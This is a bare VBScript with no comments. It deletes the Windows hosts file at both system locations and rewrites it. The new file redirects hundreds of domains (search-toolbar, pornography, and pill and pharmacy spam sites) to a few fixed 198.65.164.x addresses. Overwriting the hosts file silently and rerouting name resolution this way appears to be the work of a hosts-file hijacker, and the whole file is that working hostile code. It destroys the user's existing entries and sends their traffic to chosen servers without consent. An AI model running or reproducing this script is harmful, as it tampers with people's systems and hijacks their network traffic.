Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists("C:\WINDOWS\hosts") = True Then 
fso.DeleteFile "C:\WINDOWS\hosts", True 
end if 
If fso.FileExists("C:\WINDOWS\system32\drivers\etc\hosts") = True Then 
fso.DeleteFile "C:\WINDOWS\system32\drivers\etc\hosts", True 
end if 
Set f = fso.CreateTextFile("C:\WINDOWS\hosts", ForWriting)
Set g = fso.CreateTextFile("C:\WINDOWS\system32\drivers\etc\hosts", ForWriting)
f.writeline("127.0.0.1  localhost")
g.writeline("127.0.0.1  localhost")
f.writeline("198.65.164.171  ehttp.cc")
g.writeline("198.65.164.171  ehttp.cc")
f.writeline("198.65.164.168  winlink.biz")
g.writeline("198.65.164.168  winlink.biz")
f.writeline("198.65.164.168  winlink.ws")
g.writeline("198.65.164.168  winlink.ws")
f.writeline("198.65.164.168  ad45.com")
g.writeline("198.65.164.168  ad45.com")
f.writeline("198.65.164.168  www.ad45.com")
g.writeline("198.65.164.168  www.ad45.com")
f.writeline("198.65.164.168  ad77.com")
g.writeline("198.65.164.168  ad77.com")
f.writeline("198.65.164.168  www.ad77.com")
g.writeline("198.65.164.168  www.ad77.com")
f.writeline("198.65.164.168  ad86.com")
g.writeline("198.65.164.168  ad86.com")
f.writeline("198.65.164.168  www.ad86.com")
g.writeline("198.65.164.168  www.ad86.com")
f.writeline("198.65.164.168  ad25.com")
g.writeline("198.65.164.168  ad25.com")
f.writeline("198.65.164.168  www.ad25.com")
g.writeline("198.65.164.168  www.ad25.com")
f.writeline("198.65.164.168  00hq.com")
g.writeline("198.65.164.168  00hq.com")
f.writeline("198.65.164.168  www.00hq.com")
g.writeline("198.65.164.168  www.00hq.com")
f.writeline("198.65.164.168  8ad.com")
g.writeline("198.65.164.168  8ad.com")
f.writeline("198.65.164.168  www.8ad.com")
g.writeline("198.65.164.168  www.8ad.com")
f.writeline("198.65.164.168  searchv.com")
g.writeline("198.65.164.168  searchv.com")
f.writeline("198.65.164.168  www.searchv.com")
g.writeline("198.65.164.168  www.searchv.com")
f.writeline("198.65.164.168  008k.com")
g.writeline("198.65.164.168  008k.com")
f.writeline("198.65.164.168  www.008k.com")
g.writeline("198.65.164.168  www.008k.com")
f.writeline ("198.65.164.170  galleryspots.com")
g.writeline ("198.65.164.170  galleryspots.com")
f.writeline ("198.65.164.170  www.galleryspots.com")
g.writeline ("198.65.164.170  www.galleryspots.com")
f.writeline ("198.65.164.170  bigfreepics.com")
g.writeline ("198.65.164.170  bigfreepics.com")
f.writeline ("198.65.164.170  www.bigfreepics.com")
g.writeline ("198.65.164.170  www.bigfreepics.com")
f.writeline ("198.65.164.170  www.efinder.cc")
g.writeline ("198.65.164.170  www.efinder.cc")
f.writeline ("198.65.164.170  lop.com")
g.writeline ("198.65.164.170  lop.com")
f.writeline ("198.65.164.170  finder2003.com")
g.writeline ("198.65.164.170  finder2003.com")
f.writeline ("198.65.164.170  www.search-aid.com")
g.writeline ("198.65.164.170  www.search-aid.com")
f.writeline ("198.65.164.170  freednshost.info")
g.writeline ("198.65.164.170  freednshost.info")
f.writeline ("198.65.164.170  www.search2004.net")
g.writeline ("198.65.164.170  www.search2004.net")
f.writeline ("198.65.164.170  www.hugesearch.net")
g.writeline ("198.65.164.170  www.hugesearch.net")
f.writeline ("198.65.164.170  luckyfinder.com")
g.writeline ("198.65.164.170  luckyfinder.com")
f.writeline ("198.65.164.170  luckysearch.net")
g.writeline ("198.65.164.170  luckysearch.net")
f.writeline ("198.65.164.170  kitasearch.com")
g.writeline ("198.65.164.170  kitasearch.com")
f.writeline ("198.65.164.170  www.orbitexplorer.com")
g.writeline ("198.65.164.170  www.orbitexplorer.com")
f.writeline ("198.65.164.170  www.sqwire.com")
g.writeline ("198.65.164.170  www.sqwire.com")
f.writeline ("198.65.164.170  www.traffichog.com")
g.writeline ("198.65.164.170  www.traffichog.com")
f.writeline ("198.65.164.170  allneedsearch.com")
g.writeline ("198.65.164.170  allneedsearch.com")
f.writeline ("198.65.164.170  www.yellow500.com")
g.writeline ("198.65.164.170  www.yellow500.com")
f.writeline ("198.65.164.170  www.008i.com")
g.writeline ("198.65.164.170  www.008i.com")
f.writeline ("198.65.164.170  www.opsex.com")
g.writeline ("198.65.164.170  www.opsex.com")
f.writeline ("198.65.164.170  www.onlysex.ws")
g.writeline ("198.65.164.170  www.onlysex.ws")
f.writeline ("198.65.164.170  www.7days.ws")
g.writeline ("198.65.164.170  www.7days.ws")
f.writeline ("198.65.164.170  www.xsex.ws")
g.writeline ("198.65.164.170  www.xsex.ws")
f.writeline ("198.65.164.170  www.6o9.com")
g.writeline ("198.65.164.170  www.6o9.com")
f.writeline ("198.65.164.170  search-company.com")
g.writeline ("198.65.164.170  search-company.com")
f.writeline ("198.65.164.170  www.700k.com")
g.writeline ("198.65.164.170  www.700k.com")
f.writeline ("198.65.164.170  www.hotbookmark.com")
g.writeline ("198.65.164.170  www.hotbookmark.com")
f.writeline ("198.65.164.170  www.runsearch.com")
g.writeline ("198.65.164.170  www.runsearch.com")
f.writeline ("198.65.164.170  runsearch.com")
g.writeline ("198.65.164.170  runsearch.com")
f.writeline ("198.65.164.170  www.search-about.net")
g.writeline ("198.65.164.170  www.search-about.net")
f.writeline ("198.65.164.170  go-all.com")
g.writeline ("198.65.164.170  go-all.com")
f.writeline ("198.65.164.170  go-acct.com")
g.writeline ("198.65.164.170  go-acct.com")
f.writeline ("198.65.164.170  get-faster.com")
g.writeline ("198.65.164.170  get-faster.com")
f.writeline ("198.65.164.170  get-data.net")
g.writeline ("198.65.164.170  get-data.net")
f.writeline ("198.65.164.170  get-certified.net")
g.writeline ("198.65.164.170  get-certified.net")
f.writeline ("198.65.164.170  get-access.com")
g.writeline ("198.65.164.170  get-access.com")
f.writeline ("198.65.164.170  000info.com")
g.writeline ("198.65.164.170  000info.com")
f.writeline ("198.65.164.170  0-days.net")
g.writeline ("198.65.164.170  0-days.net")
f.writeline ("198.65.164.170  0-2u.com")
g.writeline ("198.65.164.170  0-2u.com")
f.writeline ("198.65.164.170  0-29.com")
g.writeline ("198.65.164.170  0-29.com")
f.writeline ("198.65.164.170  alfaporn.com")
g.writeline ("198.65.164.170  alfaporn.com")
f.writeline ("198.65.164.170  i-lookup.com")
g.writeline ("198.65.164.170  i-lookup.com")
f.writeline ("198.65.164.170  www.alfa-search.com")
g.writeline ("198.65.164.170  www.alfa-search.com")
f.writeline ("198.65.164.170  www.dotcomtoolbar.com")
g.writeline ("198.65.164.170  www.dotcomtoolbar.com")
f.writeline ("198.65.164.170  toteen.com")
g.writeline ("198.65.164.170  toteen.com")
f.writeline ("198.65.164.170  www.find-itnow.com")
g.writeline ("198.65.164.170  www.find-itnow.com")
f.writeline ("198.65.164.170  www.mixedporno.com")
g.writeline ("198.65.164.170  www.mixedporno.com")
f.writeline ("198.65.164.170  eliteteensites.com")
g.writeline ("198.65.164.170  eliteteensites.com")
f.writeline ("198.65.164.170  newsexgate.com")
g.writeline ("198.65.164.170  newsexgate.com")
f.writeline ("198.65.164.170  www.newsexgate.com")
g.writeline ("198.65.164.170  www.newsexgate.com")
f.writeline ("198.65.164.170  uuporn.com")
g.writeline ("198.65.164.170  uuporn.com")
f.writeline ("198.65.164.170  www.uuporn.com")
g.writeline ("198.65.164.170  www.uuporn.com")
f.writeline ("198.65.164.170  hardcorevibe.com")
g.writeline ("198.65.164.170  hardcorevibe.com")
f.writeline ("198.65.164.170  www.hardcorevibe.com")
g.writeline ("198.65.164.170  www.hardcorevibe.com")
f.writeline ("198.65.164.170  overmix.com")
g.writeline ("198.65.164.170  overmix.com")
f.writeline ("198.65.164.170  www.overmix.com")
g.writeline ("198.65.164.170  www.overmix.com")
f.writeline ("198.65.164.170  theadultgate.com")
g.writeline ("198.65.164.170  theadultgate.com")
f.writeline ("198.65.164.170  www.theadultgate.com")
g.writeline ("198.65.164.170  www.theadultgate.com")
f.writeline ("198.65.164.170  hornygate.com")
g.writeline ("198.65.164.170  hornygate.com")
f.writeline ("198.65.164.170  www.hornygate.com")
g.writeline ("198.65.164.170  www.hornygate.com")
f.writeline ("198.65.164.170  sexxx-start.com")
g.writeline ("198.65.164.170  sexxx-start.com")
f.writeline ("198.65.164.170  www.sexxx-start.com")
g.writeline ("198.65.164.170  www.sexxx-start.com")
f.writeline ("198.65.164.170  logtoporn.com")
g.writeline ("198.65.164.170  logtoporn.com")
f.writeline ("198.65.164.170  www.logtoporn.com")
g.writeline ("198.65.164.170  www.logtoporn.com")
f.writeline ("198.65.164.170  3xpower.com")
g.writeline ("198.65.164.170  3xpower.com")
f.writeline ("198.65.164.170  www.3xpower.com")
g.writeline ("198.65.164.170  www.3xpower.com")
f.writeline ("198.65.164.170  start-search.com")
g.writeline ("198.65.164.170  start-search.com")
f.writeline ("198.65.164.170  www.lookfor.cc")
g.writeline ("198.65.164.170  www.lookfor.cc")
f.writeline ("198.65.164.170  www.hotsearchbox.com")
g.writeline ("198.65.164.170  www.hotsearchbox.com")
f.writeline ("198.65.164.170  ie-search.com")
g.writeline ("198.65.164.170  ie-search.com")
f.writeline ("198.65.164.170  www.search-1.net")
g.writeline ("198.65.164.170  www.search-1.net")
f.writeline ("198.65.164.170  swift-look.com")
g.writeline ("198.65.164.170  swift-look.com")
f.writeline ("198.65.164.170  www.swift-look.com")
g.writeline ("198.65.164.170  www.swift-look.com")
f.writeline ("198.65.164.170  www.search2525.com")
g.writeline ("198.65.164.170  www.search2525.com")
f.writeline ("198.65.164.170  www.sureseeker.com")
g.writeline ("198.65.164.170  www.sureseeker.com")
f.writeline ("198.65.164.170  www.searchmeup.com")
g.writeline ("198.65.164.170  www.searchmeup.com")
f.writeline ("198.65.164.170  www.statblaster.com")
g.writeline ("198.65.164.170  www.statblaster.com")
f.writeline ("198.65.164.170  www.day4sex.com")
g.writeline ("198.65.164.170  www.day4sex.com")
f.writeline ("198.65.164.170  day4sex.com")
g.writeline ("198.65.164.170  day4sex.com")
f.writeline ("198.65.164.170  www.seek-porn.com")
g.writeline ("198.65.164.170  www.seek-porn.com")
f.writeline ("198.65.164.170  seek-porn.com")
g.writeline ("198.65.164.170  seek-porn.com")
f.writeline ("198.65.164.170  freexxxplace.com")
g.writeline ("198.65.164.170  freexxxplace.com")
f.writeline ("198.65.164.170  www.freexxxplace.com")
g.writeline ("198.65.164.170  www.freexxxplace.com")
f.writeline ("198.65.164.170  worldmpeg.com")
g.writeline ("198.65.164.170  worldmpeg.com")
f.writeline ("198.65.164.170  www.worldmpeg.com")
g.writeline ("198.65.164.170  www.worldmpeg.com")
f.writeline ("198.65.164.170  superpornlist.com")
g.writeline ("198.65.164.170  superpornlist.com")
f.writeline ("198.65.164.170  www.superpornlist.com")
g.writeline ("198.65.164.170  www.superpornlist.com")
f.writeline ("198.65.164.170  www.freepornday.com")
g.writeline ("198.65.164.170  www.freepornday.com")
f.writeline ("198.65.164.170  freepornday.com")
g.writeline ("198.65.164.170  freepornday.com")
f.writeline ("198.65.164.170  xxxqualitypics.com")
g.writeline ("198.65.164.170  xxxqualitypics.com")
f.writeline ("198.65.164.170  www.xxxqualitypics.com")
g.writeline ("198.65.164.170  www.xxxqualitypics.com")
f.writeline ("198.65.164.170  www.hot-gallery.com")
g.writeline ("198.65.164.170  www.hot-gallery.com")
f.writeline ("198.65.164.170  hot-gallery.com")
g.writeline ("198.65.164.170  hot-gallery.com")
f.writeline ("198.65.164.170  penis-enlargement.day4sex.com")
g.writeline ("198.65.164.170  penis-enlargement.day4sex.com")
f.writeline ("198.65.164.170  big-penis.day4sex.com")
g.writeline ("198.65.164.170  big-penis.day4sex.com")
f.writeline ("198.65.164.170  xnxxx.com")
g.writeline ("198.65.164.170  xnxxx.com")
f.writeline ("198.65.164.170  www.xnxxx.com")
g.writeline ("198.65.164.170  www.xnxxx.com")
f.writeline ("198.65.164.170  www.medical-penis-enlargement.com")
g.writeline ("198.65.164.170  www.medical-penis-enlargement.com")
f.writeline ("198.65.164.170  www.penis-enlargement-aid.com")
g.writeline ("198.65.164.170  www.penis-enlargement-aid.com")
f.writeline ("198.65.164.170  www.bigger-penis-enlargement-pills.com")
g.writeline ("198.65.164.170  www.bigger-penis-enlargement-pills.com")
f.writeline ("198.65.164.170  www.penis-enlargement-penis-pumps.com")
g.writeline ("198.65.164.170  www.penis-enlargement-penis-pumps.com")
f.writeline ("198.65.164.170  www.americas-drugstore.com")
g.writeline ("198.65.164.170  www.americas-drugstore.com")
f.writeline ("198.65.164.170  www.manhoodcenter.com")
g.writeline ("198.65.164.170  www.manhoodcenter.com")
f.writeline ("198.65.164.170  www.penis-enlargement-vigrx.com")
g.writeline ("198.65.164.170  www.penis-enlargement-vigrx.com")
f.writeline ("198.65.164.170  www.penis-enlargement-now.net")
g.writeline ("198.65.164.170  www.penis-enlargement-now.net")
f.writeline ("198.65.164.170  www.winning-penis-enlargement.com")
g.writeline ("198.65.164.170  www.winning-penis-enlargement.com")
f.writeline ("198.65.164.170  thepill.blogs.com")
g.writeline ("198.65.164.170  thepill.blogs.com")
f.writeline ("198.65.164.170  www.online-penis-enlargement-pills.com")
g.writeline ("198.65.164.170  www.online-penis-enlargement-pills.com")
f.writeline ("198.65.164.170  www.big-penis-enlargement-size.com")
g.writeline ("198.65.164.170  www.big-penis-enlargement-size.com")
f.writeline ("198.65.164.170  www.herbalvivid.7p.com")
g.writeline ("198.65.164.170  www.herbalvivid.7p.com")
f.writeline ("198.65.164.170  vigrx.7p.com")
g.writeline ("198.65.164.170  vigrx.7p.com")
f.writeline ("198.65.164.170  www.altpenis.com")
g.writeline ("198.65.164.170  www.altpenis.com")
f.writeline ("198.65.164.170  www.andromedical.com")
g.writeline ("198.65.164.170  www.andromedical.com")
f.writeline ("198.65.164.170  penis-enlargement.sterlins.com")
g.writeline ("198.65.164.170  penis-enlargement.sterlins.com")
f.writeline ("198.65.164.170  www.canadian-penis-pills.com")
g.writeline ("198.65.164.170  www.canadian-penis-pills.com")
f.writeline ("198.65.164.170  penis-enlargement-pills.sterlins.com")
g.writeline ("198.65.164.170  penis-enlargement-pills.sterlins.com")
f.writeline ("198.65.164.170  www.pills-vigrx.com")
g.writeline ("198.65.164.170  www.pills-vigrx.com")
f.writeline ("198.65.164.170  www.vigrx-pills4penis.com")
g.writeline ("198.65.164.170  www.vigrx-pills4penis.com")
f.writeline ("198.65.164.170  www.pills-vigrx.net")
g.writeline ("198.65.164.170  www.pills-vigrx.net")
f.writeline ("198.65.164.170  www.vigrxoil.7p.com")
g.writeline ("198.65.164.170  www.vigrxoil.7p.com")
f.writeline ("198.65.164.170  www.vimaxnow.com")
g.writeline ("198.65.164.170  www.vimaxnow.com")
f.writeline ("198.65.164.170  www.penis--pills.us")
g.writeline ("198.65.164.170  www.penis--pills.us")
f.writeline ("198.65.164.170  www.vimax-now.net")
g.writeline ("198.65.164.170  www.vimax-now.net")
f.writeline ("198.65.164.170  www.penis-vig-rx.net")
g.writeline ("198.65.164.170  www.penis-vig-rx.net")
f.writeline ("198.65.164.170  www.vig-rx-buy.com")
g.writeline ("198.65.164.170  www.vig-rx-buy.com")
f.writeline ("198.65.164.170  www.penis-pills-vig-rx.net")
g.writeline ("198.65.164.170  www.penis-pills-vig-rx.net")
f.writeline ("198.65.164.170  www.male-vig-rx.com")
g.writeline ("198.65.164.170  www.male-vig-rx.com")
f.writeline ("198.65.164.170  www.pills4penis-vig-rx.com")
g.writeline ("198.65.164.170  www.pills4penis-vig-rx.com")
f.writeline ("198.65.164.170  www.penis-pills-vig-rx.com")
g.writeline ("198.65.164.170  www.penis-pills-vig-rx.com")
f.writeline ("198.65.164.170  www.male-vig-rx.net")
g.writeline ("198.65.164.170  www.male-vig-rx.net")
f.writeline ("198.65.164.170  www.pillsrus.com")
g.writeline ("198.65.164.170  www.pillsrus.com")
f.writeline ("198.65.164.170  www.penis-enlargement-options.com")
g.writeline ("198.65.164.170  www.penis-enlargement-options.com")
f.writeline ("198.65.164.170  www.9penispills.com")
g.writeline ("198.65.164.170  www.9penispills.com")
f.writeline ("198.65.164.170  www.vprx-penis-pills.com")
g.writeline ("198.65.164.170  www.vprx-penis-pills.com")
f.writeline ("198.65.164.170  www.vigrx-penis-pills.com")
g.writeline ("198.65.164.170  www.vigrx-penis-pills.com")
f.writeline ("198.65.164.170  www.penis-enlargement-pills-vimax.com")
g.writeline ("198.65.164.170  www.penis-enlargement-pills-vimax.com")
f.writeline ("198.65.164.170  penis-enlargement-vimax-pills.com")
g.writeline ("198.65.164.170  penis-enlargement-vimax-pills.com")
f.writeline ("198.65.164.170  www.penis-to-enlarge.net")
g.writeline ("198.65.164.170  www.penis-to-enlarge.net")
f.writeline ("198.65.164.170  www.enlarge-your-penis.org")
g.writeline ("198.65.164.170  www.enlarge-your-penis.org")
f.writeline ("198.65.164.170  www.penis-enlargement-reviews.com")
g.writeline ("198.65.164.170  www.penis-enlargement-reviews.com")
f.writeline ("198.65.164.170  www.build-penis.com")
g.writeline ("198.65.164.170  www.build-penis.com")
f.writeline ("198.65.164.170  www.quality-penis-enlargement-pills.net")
g.writeline ("198.65.164.170  www.quality-penis-enlargement-pills.net")
f.writeline ("198.65.164.170  www.quality-penis-pills.net")
g.writeline ("198.65.164.170  www.quality-penis-pills.net")
f.writeline ("198.65.164.170  www.rapid-penis-enlargement.net")
g.writeline ("198.65.164.170  www.rapid-penis-enlargement.net")
f.writeline ("198.65.164.170  www.average-male-penis-size-surveys.com")
g.writeline ("198.65.164.170  www.average-male-penis-size-surveys.com")
f.writeline ("198.65.164.170  www.small-penis-size.com")
g.writeline ("198.65.164.170  www.small-penis-size.com")
f.writeline ("198.65.164.170  www.penis-enlargement-safe.net")
g.writeline ("198.65.164.170  www.penis-enlargement-safe.net")
f.writeline ("198.65.164.170  www.cheap-vigrx.net")
g.writeline ("198.65.164.170  www.cheap-vigrx.net")
f.writeline ("198.65.164.170  www.penis-enlargement-capsule.net")
g.writeline ("198.65.164.170  www.penis-enlargement-capsule.net")
f.writeline ("198.65.164.170  www.top-penis-enlargement-pills.net")
g.writeline ("198.65.164.170  www.top-penis-enlargement-pills.net")
f.writeline ("198.65.164.170  www.try-penis-pills.net")
g.writeline ("198.65.164.170  www.try-penis-pills.net")
f.writeline ("198.65.164.170  www.do-penis-enlargement-pills-work.net")
g.writeline ("198.65.164.170  www.do-penis-enlargement-pills-work.net")
f.writeline ("198.65.164.170  www.penis-enlargement-medication.net")
g.writeline ("198.65.164.170  www.penis-enlargement-medication.net")
f.writeline ("198.65.164.170  www.only-penis-enlargement.com")
g.writeline ("198.65.164.170  www.only-penis-enlargement.com")
f.writeline ("198.65.164.170  www.penis-enhancement-pills.biz")
g.writeline ("198.65.164.170  www.penis-enhancement-pills.biz")
f.writeline ("198.65.164.170  www.optimumpenis.com")
g.writeline ("198.65.164.170  www.optimumpenis.com")
f.writeline ("198.65.164.170  www.newsudan.com")
g.writeline ("198.65.164.170  www.newsudan.com")
f.writeline ("198.65.164.170  penis-enlargement.itinto.us")
g.writeline ("198.65.164.170  penis-enlargement.itinto.us")
f.writeline ("198.65.164.170  www.effective-penis-pills.net")
g.writeline ("198.65.164.170  www.effective-penis-pills.net")
f.writeline ("198.65.164.170  www.allegra.com")
g.writeline ("198.65.164.170  www.allegra.com")
f.writeline ("198.65.164.170  www.247pharmacy.org")
g.writeline ("198.65.164.170  www.247pharmacy.org")
f.writeline ("198.65.164.170  www.cheap-allegra.com")
g.writeline ("198.65.164.170  www.cheap-allegra.com")
f.writeline ("198.65.164.170  www.allegra-d.online-pills.biz")
g.writeline ("198.65.164.170  www.allegra-d.online-pills.biz")
f.writeline ("198.65.164.170  www.allegra-pharmacy.net")
g.writeline ("198.65.164.170  www.allegra-pharmacy.net")
f.writeline ("198.65.164.170  www.rx-pills-r.us")
g.writeline ("198.65.164.170  www.rx-pills-r.us")
f.writeline ("198.65.164.170  www.phenterminepharmacy.biz")
g.writeline ("198.65.164.170  www.phenterminepharmacy.biz")
f.writeline ("198.65.164.170  www.allergy-info.com")
g.writeline ("198.65.164.170  www.allergy-info.com")
f.writeline ("198.65.164.170  zyrtec.pharmaciecall.com")
g.writeline ("198.65.164.170  zyrtec.pharmaciecall.com")
f.writeline ("198.65.164.170  www.breastenlargementmagazine.com")
g.writeline ("198.65.164.170  www.breastenlargementmagazine.com")
f.writeline ("198.65.164.170  www.addbust.com")
g.writeline ("198.65.164.170  www.addbust.com")
f.writeline ("198.65.164.170  www.try-penis-enlargement.net")
g.writeline ("198.65.164.170  www.try-penis-enlargement.net")
f.writeline ("198.65.164.170  www.pillsreview.com")
g.writeline ("198.65.164.170  www.pillsreview.com")
f.writeline ("198.65.164.170  www.eradotic.com")
g.writeline ("198.65.164.170  www.eradotic.com")
f.writeline ("198.65.164.170  www.penisadd.com")
g.writeline ("198.65.164.170  www.penisadd.com")
f.writeline ("198.65.164.170  www.altpenisenlargement.com")
g.writeline ("198.65.164.170  www.altpenisenlargement.com")
f.writeline ("198.65.164.170  www.enlarging-your.com")
g.writeline ("198.65.164.170  www.enlarging-your.com")
f.writeline ("198.65.164.170  penisenlargementmagazine.com")
g.writeline ("198.65.164.170  penisenlargementmagazine.com")
f.writeline ("198.65.164.170  www.penis-enlargement-guaranteed.com")
g.writeline ("198.65.164.170  www.penis-enlargement-guaranteed.com")
f.writeline ("198.65.164.170  penis-enlargement.enlarging-your.com")
g.writeline ("198.65.164.170  penis-enlargement.enlarging-your.com")
f.writeline ("198.65.164.170  www.absolute-penis-enlargement.com")
g.writeline ("198.65.164.170  www.absolute-penis-enlargement.com")
f.writeline ("198.65.164.170  penis-enlargement.apexglobal.net")
g.writeline ("198.65.164.170  penis-enlargement.apexglobal.net")
f.writeline ("198.65.164.170  www.cccit.com")
g.writeline ("198.65.164.170  www.cccit.com")
f.writeline ("198.65.164.170  www.a1a-penis-enlargement.com")
g.writeline ("198.65.164.170  www.a1a-penis-enlargement.com")
f.writeline ("198.65.164.170  www.penis--enlargement.us")
g.writeline ("198.65.164.170  www.penis--enlargement.us")
f.writeline ("198.65.164.170  www.penis-enlargement.cc")
g.writeline ("198.65.164.170  www.penis-enlargement.cc")
f.writeline ("198.65.164.170  www.penis-enlargement-pills.com")
g.writeline ("198.65.164.170  www.penis-enlargement-pills.com")
f.writeline ("198.65.164.170  www.menzyme.com")
g.writeline ("198.65.164.170  www.menzyme.com")
f.writeline ("198.65.164.170  www.size-pills.com")
g.writeline ("198.65.164.170  www.size-pills.com")
f.writeline ("198.65.164.170  www.penis-enhancement-pills.com")
g.writeline ("198.65.164.170  www.penis-enhancement-pills.com")
f.writeline ("198.65.164.170  www.nosurgery-penis-enlargement.com")
g.writeline ("198.65.164.170  www.nosurgery-penis-enlargement.com")
f.writeline ("198.65.164.170  www.penis-enlargement-pills-today.com")
g.writeline ("198.65.164.170  www.penis-enlargement-pills-today.com")
f.writeline ("198.65.164.170  pbclean.net")
g.writeline ("198.65.164.170  pbclean.net")
f.writeline ("198.65.164.170  www.prosolutionpills.netfirms.com")
g.writeline ("198.65.164.170  www.prosolutionpills.netfirms.com")
f.writeline ("198.65.164.170  www.penis-enlargement-up.com")
g.writeline ("198.65.164.170  www.penis-enlargement-up.com")
f.writeline ("198.65.164.170  tours2.bigdick.com")
g.writeline ("198.65.164.170  tours2.bigdick.com")
f.writeline ("198.65.164.170  www.wishing.com")
g.writeline ("198.65.164.170  www.wishing.com")
f.writeline ("198.65.164.170  www.penis-enlargement-patch-review.com")
g.writeline ("198.65.164.170  www.penis-enlargement-patch-review.com")
f.writeline ("198.65.164.170  tours4.bigdick.com")
g.writeline ("198.65.164.170  tours4.bigdick.com")
f.writeline ("198.65.164.170  www.largenow.com")
g.writeline ("198.65.164.170  www.largenow.com")
f.writeline ("198.65.164.170  www.naturalpenis.by.ru")
g.writeline ("198.65.164.170  www.naturalpenis.by.ru")
f.writeline ("198.65.164.170  nipple-enlargement-surgery-pills.strawberryent.com")
g.writeline ("198.65.164.170  nipple-enlargement-surgery-pills.strawberryent.com")
f.writeline ("198.65.164.170  breast-enlargement-surgery-pills.strawberryent.com")
g.writeline ("198.65.164.170  breast-enlargement-surgery-pills.strawberryent.com")
f.writeline ("198.65.164.170  www.separateways.org")
g.writeline ("198.65.164.170  www.separateways.org")
f.writeline ("198.65.164.170  www.tipsforabiggerpenis.com")
g.writeline ("198.65.164.170  www.tipsforabiggerpenis.com")
f.writeline ("198.65.164.170  www.howtoenlargeapenis.com")
g.writeline ("198.65.164.170  www.howtoenlargeapenis.com")
f.writeline ("198.65.164.170  www.menspenisenlargement.com")
g.writeline ("198.65.164.170  www.menspenisenlargement.com")
f.writeline ("198.65.164.170  pet.thebugs.ws")
g.writeline ("198.65.164.170  pet.thebugs.ws")
f.writeline ("198.65.164.170  www.on-line-vigrx.com")
g.writeline ("198.65.164.170  www.on-line-vigrx.com")
f.writeline ("198.65.164.170  www.addbust.com")
g.writeline ("198.65.164.170  www.addbust.com")
f.writeline ("198.65.164.170  www.online-vigrx.com")
g.writeline ("198.65.164.170  www.online-vigrx.com")
f.writeline ("198.65.164.170  www.altpenissize.com")
g.writeline ("198.65.164.170  www.altpenissize.com")
f.writeline ("198.65.164.170  www.inexpensive-vigrx.com")
g.writeline ("198.65.164.170  www.inexpensive-vigrx.com")
f.writeline ("198.65.164.170  www.pills-magna-rx.com")
g.writeline ("198.65.164.170  www.pills-magna-rx.com")
f.writeline ("198.65.164.170  www.special-hair-removal.com")
g.writeline ("198.65.164.170  www.special-hair-removal.com")
f.writeline ("198.65.164.170  www.winning-celebrex.com")
g.writeline ("198.65.164.170  www.winning-celebrex.com")
f.writeline ("198.65.164.170  www.amazing-phentermine.com")
g.writeline ("198.65.164.170  www.amazing-phentermine.com")
f.writeline ("198.65.164.170  www.magna-rx-penis-pills.com")
g.writeline ("198.65.164.170  www.magna-rx-penis-pills.com")
f.writeline ("198.65.164.170  www.big-penis-enlargement-pills.tk")
g.writeline ("198.65.164.170  www.big-penis-enlargement-pills.tk")
f.writeline ("198.65.164.170  vimax.build-penis.com")
g.writeline ("198.65.164.170  vimax.build-penis.com")
f.writeline ("198.65.164.170  virility-pills.apexglobal.net")
g.writeline ("198.65.164.170  virility-pills.apexglobal.net")
f.writeline ("198.65.164.170  best-penis-pills.apexglobal.net")
g.writeline ("198.65.164.170  best-penis-pills.apexglobal.net")
f.writeline ("198.65.164.170  www.seen-on-tv-penis-pills.com")
g.writeline ("198.65.164.170  www.seen-on-tv-penis-pills.com")
f.writeline ("198.65.164.170  www.big-penis-secrets.com")
g.writeline ("198.65.164.170  www.big-penis-secrets.com")
f.writeline ("198.65.164.170  www.pills-penis-enlargement.net")
g.writeline ("198.65.164.170  www.pills-penis-enlargement.net")
f.writeline ("198.65.164.170  penis-pills.day4sex.com")
g.writeline ("198.65.164.170  penis-pills.day4sex.com")
f.writeline ("198.65.164.170  www.herbal-penis-enlargement-pills.net")
g.writeline ("198.65.164.170  www.herbal-penis-enlargement-pills.net")
f.writeline ("198.65.164.170  www.forsize.com")
g.writeline ("198.65.164.170  www.forsize.com")
f.writeline ("198.65.164.170  www.all-about-penis.biz")
g.writeline ("198.65.164.170  www.all-about-penis.biz")
f.writeline ("198.65.164.170  www.penis-pills-secrets.net")
g.writeline ("198.65.164.170  www.penis-pills-secrets.net")
f.writeline ("198.65.164.170  www.penis-pills-advice.net")
g.writeline ("198.65.164.170  www.penis-pills-advice.net")
f.writeline ("198.65.164.170  www.penis-enlarger-pills.net")
g.writeline ("198.65.164.170  www.penis-enlarger-pills.net")
f.writeline ("198.65.164.170  www.penis-enlargement-advice.net")
g.writeline ("198.65.164.170  www.penis-enlargement-advice.net")
f.writeline ("198.65.164.170  www.effective-penis-enlargement.net")
g.writeline ("198.65.164.170  www.effective-penis-enlargement.net")
f.writeline ("198.65.164.170  www.drugsexperts.com")
g.writeline ("198.65.164.170  www.drugsexperts.com")
f.writeline ("198.65.164.170  buy-generic-viagra.org")
g.writeline ("198.65.164.170  buy-generic-viagra.org")
f.writeline ("198.65.164.170  www.buy-generic-viagra.org")
g.writeline ("198.65.164.170  www.buy-generic-viagra.org")
f.writeline ("198.65.164.170  big-breast-success.com")
g.writeline ("198.65.164.170  big-breast-success.com")
f.writeline ("198.65.164.170  www.big-breast-success.com")
g.writeline ("198.65.164.170  www.big-breast-success.com")
f.writeline ("198.65.164.170  big-penis.xnxxx.com")
g.writeline ("198.65.164.170  big-penis.xnxxx.com")
f.writeline ("198.65.164.170  www.maleenhancementnetwork.com")
g.writeline ("198.65.164.170  www.maleenhancementnetwork.com")
f.writeline ("198.65.164.170  www.enhancementresearch.com")
g.writeline ("198.65.164.170  www.enhancementresearch.com")
f.writeline ("198.65.164.170  natural-penis-enlargement.drugsexperts.com")
g.writeline ("198.65.164.170  natural-penis-enlargement.drugsexperts.com")
f.writeline ("198.65.164.170  penis-bigger.drugsexperts.com")
g.writeline ("198.65.164.170  penis-bigger.drugsexperts.com")
f.writeline ("198.65.164.170  low-fat.drugsexperts.com")
g.writeline ("198.65.164.170  low-fat.drugsexperts.com")
f.writeline ("198.65.164.170  discount-prescription-drugs.drugsexperts.com")
g.writeline ("198.65.164.170  discount-prescription-drugs.drugsexperts.com")
f.writeline ("198.65.164.170  levitra-viagra.drugsexperts.com")
g.writeline ("198.65.164.170  levitra-viagra.drugsexperts.com")
f.writeline ("198.65.164.170  increase-breast.drugsexperts.com")
g.writeline ("198.65.164.170  increase-breast.drugsexperts.com")
f.writeline ("198.65.164.170  cheapest-viagra.drugsexperts.com")
g.writeline ("198.65.164.170  cheapest-viagra.drugsexperts.com")
f.writeline ("198.65.164.170  viagra-cheap.drugsexperts.com")
g.writeline ("198.65.164.170  viagra-cheap.drugsexperts.com")
